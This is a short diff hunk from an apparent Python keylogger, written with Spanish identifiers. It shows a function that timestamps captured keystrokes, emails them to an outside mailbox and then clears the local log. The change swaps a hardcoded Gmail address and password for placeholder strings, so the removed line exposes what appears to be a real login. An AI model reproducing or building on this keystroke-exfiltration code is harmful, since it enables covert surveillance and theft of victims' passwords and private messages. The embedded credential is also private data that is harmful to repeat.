@@ -22,7 +22,7 @@ def EnviarEmail():
         data = data.replace('Return', '\n')
         data = 'Mensaje capturado a las: '+ fecha + '\n\n' + data
         print (data)
-        crearEmail('pruebakeyloggerpaste@gmail.com', 'pastelito123', 'pruebakeyloggerpaste@gmail.com', 'Nueva captura:' +fecha, data)
+        crearEmail('CORREO DE EN DONDE SE MANDA', 'CONTRASEÑA', 'CORREO A DONDE SE VA A MANDAR', 'Nueva captura:' +fecha, data)
         f.seek(0)
         f.truncate()
 
